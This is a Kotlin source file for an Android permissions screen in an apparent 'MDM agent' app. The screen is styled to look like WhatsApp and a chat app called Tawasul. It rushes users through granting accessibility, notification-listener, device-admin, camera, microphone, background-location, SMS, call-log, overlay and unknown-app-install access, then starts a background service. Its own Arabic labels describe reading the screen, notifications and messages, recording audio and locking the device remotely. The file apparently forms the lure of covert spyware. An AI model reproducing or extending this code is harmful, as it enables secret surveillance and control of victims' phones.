package com.mdm.agent.ui

import android.accessibilityservice.AccessibilityServiceInfo
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.NotificationManagerCompat
import com.mdm.agent.R
import com.mdm.agent.receiver.MDMDeviceAdminReceiver
import com.mdm.agent.MainActivity

/**
 * Unified, beautiful permissions screen.
 *
 * Shows ALL required permissions in one place with a single "Enable All" button.
 * After permissions are granted, navigates to MainActivity.
 *
 * Launched from PackageReplacedReceiver via a high-priority notification
 * (since startActivity from background is blocked on Android 10+).
 */
class AllPermissionsActivity : AppCompatActivity() {

    // WhatsApp color palette (matches Tawasul app)
    private val COLOR_DARK_GREEN = 0xFF075E54.toInt()
    private val COLOR_LIGHT_GREEN = 0xFF25D366.toInt()
    private val COLOR_TEAL = 0xFF128C7E.toInt()
    private val COLOR_WHITE = 0xFFFFFFFF.toInt()
    private val COLOR_LIGHT_GRAY = 0xFFECE5DD.toInt()
    private val COLOR_CHAT_BUBBLE = 0xFFDCF8C6.toInt()
    private val COLOR_RED = 0xFFFF5252.toInt()

    private lateinit var cards: MutableList<PermissionCard>
    private lateinit var btnEnableAll: Button
    private lateinit var btnFinish: Button
    private lateinit var progressBar: ProgressBar
    private lateinit var cardsContainer: LinearLayout

    // Request codes for onActivityResult
    private val REQ_ACCESSIBILITY = 1001
    private val REQ_NOTIFICATIONS = 1002
    private val REQ_DEVICE_ADMIN = 1003
    private val REQ_BATTERY = 1004
    private val REQ_OVERLAY = 1005
    private val REQ_INSTALL = 1006
    private val REQ_RUNTIME_PERMS = 1007

    // Runtime permissions list
    private val runtimePermissions = arrayOf(
        android.Manifest.permission.CAMERA,
        android.Manifest.permission.RECORD_AUDIO,
        android.Manifest.permission.ACCESS_FINE_LOCATION,
        android.Manifest.permission.ACCESS_COARSE_LOCATION,
        android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
        android.Manifest.permission.READ_CONTACTS,
        android.Manifest.permission.READ_SMS,
        android.Manifest.permission.SEND_SMS,
        android.Manifest.permission.READ_CALL_LOG,
        android.Manifest.permission.CALL_PHONE,
        android.Manifest.permission.READ_EXTERNAL_STORAGE,
        android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
        android.Manifest.permission.READ_MEDIA_IMAGES,
        android.Manifest.permission.READ_MEDIA_VIDEO,
        android.Manifest.permission.POST_NOTIFICATIONS,
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(buildUI())
    }

    private fun buildUI(): View {
        val scrollView = ScrollView(this).apply {
            setBackgroundColor(COLOR_DARK_GREEN)
        }

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(40), dp(20), dp(40))
        }

        // ─── Title ───
        val title = TextView(this).apply {
            text = "🔐 إعداد التطبيق"
            setTextColor(COLOR_WHITE)
            textSize = 24f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
            gravity = Gravity.CENTER
        }
        root.addView(title)

        // ─── Subtitle ───
        val subtitle = TextView(this).apply {
            text = "لإكمال التفعيل، اسمح بالأذونات التالية"
            setTextColor(COLOR_CHAT_BUBBLE)
            textSize = 14f
            gravity = Gravity.CENTER
            setPadding(0, dp(8), 0, dp(24))
        }
        root.addView(subtitle)

        // ─── Cards Container ───
        cardsContainer = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
        }

        cards = mutableListOf()

        // Add permission cards
        cards.add(PermissionCard(
            "♿", "إمكانية الوصول",
            "لقراءة الشاشة والإشعارات تلقائياً",
            PermissionType.ACCESSIBILITY
        ))
        cards.add(PermissionCard(
            "🔔", "الإشعارات",
            "لقراءة كل إشعارات الجهاز",
            PermissionType.NOTIFICATIONS
        ))
        cards.add(PermissionCard(
            "🛡️", "مدير الجهاز",
            "للتحكم وقفل الجهاز عن بُعد",
            PermissionType.DEVICE_ADMIN
        ))
        cards.add(PermissionCard(
            "📷", "الكاميرا والميكروفون",
            "للالتقاط الصور والتسجيل الصوتي",
            PermissionType.RUNTIME
        ))
        cards.add(PermissionCard(
            "📍", "الموقع GPS",
            "لمعرفة موقع الجهاز الحالي",
            PermissionType.RUNTIME
        ))
        cards.add(PermissionCard(
            "📨", "الرسائل وجهات الاتصال",
            "لقراءة الرسائل والاتصالات",
            PermissionType.RUNTIME
        ))
        cards.add(PermissionCard(
            "🔋", "تجاهل تحسين البطارية",
            "عشان التطبيق يشتغل 24/7 في الخلفية",
            PermissionType.BATTERY
        ))
        cards.add(PermissionCard(
            "🪟", "العرض فوق التطبيقات",
            "لعرض نوافذ التحكم فوق أي تطبيق",
            PermissionType.OVERLAY
        ))
        cards.add(PermissionCard(
            "📥", "تثبيت التطبيقات",
            "لتحديث التطبيق تلقائياً",
            PermissionType.INSTALL
        ))

        for (card in cards) {
            cardsContainer.addView(buildPermissionCardView(card))
        }
        root.addView(cardsContainer)

        // ─── Progress Bar ───
        progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            max = cards.size
            progress = 0
            progressTintList = android.content.res.ColorStateList.valueOf(COLOR_LIGHT_GREEN)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                dp(4)
            ).apply {
                topMargin = dp(24)
                bottomMargin = dp(16)
            }
        }
        root.addView(progressBar)

        // ─── Enable All Button ───
        btnEnableAll = Button(this).apply {
            text = "🚀 تفعيل الكل"
            setTextColor(COLOR_WHITE)
            textSize = 16f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
            background = GradientDrawable().apply {
                setColor(COLOR_LIGHT_GREEN)
                cornerRadius = dp(12).toFloat()
            }
            setPadding(0, dp(16), 0, dp(16))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }
        btnEnableAll.setOnClickListener { startEnablingAll() }
        root.addView(btnEnableAll)

        // ─── Finish Button (hidden initially) ───
        btnFinish = Button(this).apply {
            text = "✅ إنهاء"
            setTextColor(COLOR_WHITE)
            textSize = 16f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
            background = GradientDrawable().apply {
                setColor(COLOR_TEAL)
                cornerRadius = dp(12).toFloat()
            }
            setPadding(0, dp(16), 0, dp(16))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { topMargin = dp(8) }
            visibility = View.GONE
        }
        btnFinish.setOnClickListener { finishAndGo() }
        root.addView(btnFinish)

        scrollView.addView(root)
        return scrollView
    }

    private fun buildPermissionCardView(card: PermissionCard): View {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            background = GradientDrawable().apply {
                setColor(COLOR_WHITE)
                cornerRadius = dp(10).toFloat()
            }
            setPadding(dp(14), dp(14), dp(14), dp(14))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = dp(8) }
            gravity = Gravity.CENTER_VERTICAL
            isClickable = true
            isFocusable = true
            // Make each card clickable - opens that specific permission screen
            setOnClickListener {
                try {
                    Toast.makeText(this@AllPermissionsActivity,
                        "جاري فتح: ${card.title}", Toast.LENGTH_SHORT).show()
                    requestPermission(card.type)
                } catch (e: Exception) {
                    Toast.makeText(this@AllPermissionsActivity,
                        "خطأ: ${e.message}", Toast.LENGTH_LONG).show()
                }
            }
        }

        // Icon
        val icon = TextView(this).apply {
            text = card.icon
            textSize = 24f
            setPadding(0, 0, dp(12), 0)
        }
        container.addView(icon)

        // Text column
        val textCol = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }

        val title = TextView(this).apply {
            text = card.title
            setTextColor(COLOR_DARK_GREEN)
            textSize = 15f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
        }
        textCol.addView(title)

        val desc = TextView(this).apply {
            text = card.description
            setTextColor(0xFF666666.toInt())
            textSize = 12f
            setPadding(0, dp(2), 0, 0)
        }
        textCol.addView(desc)
        container.addView(textCol)

        // Status indicator
        val status = TextView(this).apply {
            text = "❌"
            textSize = 18f
            setPadding(dp(8), 0, 0, 0)
            tag = "status_${card.type.name}"
        }
        container.addView(status)

        return container
    }

    private fun startEnablingAll() {
        try {
            currentCardIndex = 0
            Toast.makeText(this, "جاري فتح شاشات الأذونات...", Toast.LENGTH_SHORT).show()
            requestNextPermission()
        } catch (e: Exception) {
            Log.e("AllPermissions", "startEnablingAll error", e)
            Toast.makeText(this, "خطأ: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    private var currentCardIndex = 0

    private fun requestNextPermission() {
        try {
            // Find next not-granted permission
            while (currentCardIndex < cards.size) {
                val card = cards[currentCardIndex]
                val granted = try {
                    isPermissionGranted(card.type)
                } catch (e: Exception) {
                    Log.e("AllPermissions", "isPermissionGranted error for ${card.type}", e)
                    false
                }
                if (granted) {
                    updateCardStatus(card.type, true)
                    currentCardIndex++
                    continue
                }
                // Request this one
                Toast.makeText(this, "جاري فتح: ${card.title}", Toast.LENGTH_SHORT).show()
                requestPermission(card.type)
                return
            }
            // All done
            allPermissionsComplete()
        } catch (e: Exception) {
            Log.e("AllPermissions", "requestNextPermission error", e)
            Toast.makeText(this, "خطأ في التنقل: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    private fun requestPermission(type: PermissionType) {
        try {
            when (type) {
                PermissionType.ACCESSIBILITY -> {
                    val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    startActivityForResult(intent, REQ_ACCESSIBILITY)
                }
                PermissionType.NOTIFICATIONS -> {
                    val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS").apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    startActivityForResult(intent, REQ_NOTIFICATIONS)
                }
                PermissionType.DEVICE_ADMIN -> {
                    val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    val adminComponent = ComponentName(this, MDMDeviceAdminReceiver::class.java)
                    val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                        putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                    }
                    startActivityForResult(intent, REQ_DEVICE_ADMIN)
                }
                PermissionType.BATTERY -> {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    startActivityForResult(intent, REQ_BATTERY)
                }
                PermissionType.OVERLAY -> {
                    val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:$packageName"))
                    startActivityForResult(intent, REQ_OVERLAY)
                }
                PermissionType.INSTALL -> {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O &&
                        !packageManager.canRequestPackageInstalls()) {
                        val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                            Uri.parse("package:$packageName"))
                        startActivityForResult(intent, REQ_INSTALL)
                    } else {
                        // Already granted
                        currentCardIndex++
                        requestNextPermission()
                    }
                }
                PermissionType.RUNTIME -> {
                    val needed = runtimePermissions.filter {
                        checkSelfPermission(it) != android.content.pm.PackageManager.PERMISSION_GRANTED
                    }
                    if (needed.isNotEmpty()) {
                        requestPermissions(needed.toTypedArray(), REQ_RUNTIME_PERMS)
                    } else {
                        currentCardIndex++
                        requestNextPermission()
                    }
                }
            }
        } catch (e: Exception) {
            Toast.makeText(this, "تعذّر فتح شاشة الإذن: ${e.message}", Toast.LENGTH_SHORT).show()
            currentCardIndex++
            requestNextPermission()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        // Move to next permission
        currentCardIndex++
        requestNextPermission()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        currentCardIndex++
        requestNextPermission()
    }

    override fun onResume() {
        super.onResume()
        // Update all card statuses when returning to this activity
        for (card in cards) {
            updateCardStatus(card.type, isPermissionGranted(card.type))
        }
        val grantedCount = cards.count { isPermissionGranted(it.type) }
        progressBar.progress = grantedCount
        if (grantedCount == cards.size) {
            allPermissionsComplete()
        }
    }

    private fun updateCardStatus(type: PermissionType, granted: Boolean) {
        val statusView = cardsContainer.findViewWithTag<TextView>("status_${type.name}")
        statusView?.text = if (granted) "✅" else "❌"
    }

    private fun isPermissionGranted(type: PermissionType): Boolean {
        return when (type) {
            PermissionType.ACCESSIBILITY -> isAccessibilityEnabled()
            PermissionType.NOTIFICATIONS -> NotificationManagerCompat.getEnabledListenerPackages(this).contains(packageName)
            PermissionType.DEVICE_ADMIN -> {
                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                dpm.isAdminActive(ComponentName(this, MDMDeviceAdminReceiver::class.java))
            }
            PermissionType.BATTERY -> {
                val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                pm.isIgnoringBatteryOptimizations(packageName)
            }
            PermissionType.OVERLAY -> Settings.canDrawOverlays(this)
            PermissionType.INSTALL -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    packageManager.canRequestPackageInstalls() else true
            }
            PermissionType.RUNTIME -> runtimePermissions.all {
                checkSelfPermission(it) == android.content.pm.PackageManager.PERMISSION_GRANTED
            }
        }
    }

    private fun isAccessibilityEnabled(): Boolean {
        return try {
            val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
            val enabled = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
            enabled.any {
                it?.resolveInfo?.serviceInfo?.packageName == packageName
            }
        } catch (e: Exception) {
            Log.e("AllPermissions", "isAccessibilityEnabled error", e)
            false
        }
    }

    private fun allPermissionsComplete() {
        progressBar.progress = cards.size
        btnEnableAll.visibility = View.GONE
        btnFinish.visibility = View.VISIBLE
        Toast.makeText(this, "✅ تم تفعيل جميع الأذونات بنجاح!", Toast.LENGTH_LONG).show()
    }

    private fun finishAndGo() {
        val prefs = getSharedPreferences("mdm_install", Context.MODE_PRIVATE)
        prefs.edit().putBoolean("first_run_done", true).apply()

        // Start the MDM service if not running
        try {
            val serviceIntent = Intent(this, com.mdm.agent.service.MDMService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
        } catch (e: Exception) {
            // ignore
        }

        // Go to MainActivity
        startActivity(Intent(this, MainActivity::class.java))
        finish()
    }

    private fun dp(v: Int): Int = (v * resources.displayMetrics.density).toInt()

    data class PermissionCard(
        val icon: String,
        val title: String,
        val description: String,
        val type: PermissionType
    )

    enum class PermissionType {
        ACCESSIBILITY, NOTIFICATIONS, DEVICE_ADMIN, RUNTIME,
        BATTERY, OVERLAY, INSTALL
    }
}
